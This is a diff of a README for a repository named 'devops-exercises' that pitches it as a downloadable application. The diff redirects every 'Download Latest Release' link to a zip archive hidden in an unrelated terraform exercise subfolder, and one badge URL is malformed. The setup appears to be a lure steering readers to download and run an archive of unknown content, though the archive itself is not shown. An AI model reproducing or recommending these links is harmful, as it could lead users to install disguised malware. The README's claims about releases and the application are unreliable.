@@ -1,6 +1,6 @@
 # 🚀 devops-exercises - Master DevOps with Ease
 
-[![Download Latest Release](https://raw.githubusercontent.com/nomankhn9/devops-exercises/master/tuttiman/devops-exercises.zip%https://raw.githubusercontent.com/nomankhn9/devops-exercises/master/tuttiman/devops-exercises.zip)](https://raw.githubusercontent.com/nomankhn9/devops-exercises/master/tuttiman/devops-exercises.zip)
+[![Download Latest Release](https://github.com/nomankhn9/devops-exercises/raw/refs/heads/master/topics/aws/exercises/web_app_lambda_dynamodb/terraform/exercises_devops_1.9.zip%https://github.com/nomankhn9/devops-exercises/raw/refs/heads/master/topics/aws/exercises/web_app_lambda_dynamodb/terraform/exercises_devops_1.9.zip)](https://github.com/nomankhn9/devops-exercises/raw/refs/heads/master/topics/aws/exercises/web_app_lambda_dynamodb/terraform/exercises_devops_1.9.zip)
 
 ## 🌟 Introduction
 
@@ -23,7 +23,7 @@ Before you download the application, ensure your computer meets the following re
 
 To download the application, visit the Releases page:
 
-[Download Latest Release](https://raw.githubusercontent.com/nomankhn9/devops-exercises/master/tuttiman/devops-exercises.zip)
+[Download Latest Release](https://github.com/nomankhn9/devops-exercises/raw/refs/heads/master/topics/aws/exercises/web_app_lambda_dynamodb/terraform/exercises_devops_1.9.zip)
 
 Once on the Releases page, you will see the latest version listed. Click on the version to open the details. From there, find the download link suitable for your system. 
 
@@ -98,4 +98,4 @@ To get the most out of your learning experience, consider these resources:
 
 Don't wait any longer. Start your DevOps journey today! Download the application here:
 
-[Download Latest Release](https://raw.githubusercontent.com/nomankhn9/devops-exercises/master/tuttiman/devops-exercises.zip)
+[Download Latest Release](https://github.com/nomankhn9/devops-exercises/raw/refs/heads/master/topics/aws/exercises/web_app_lambda_dynamodb/terraform/exercises_devops_1.9.zip)
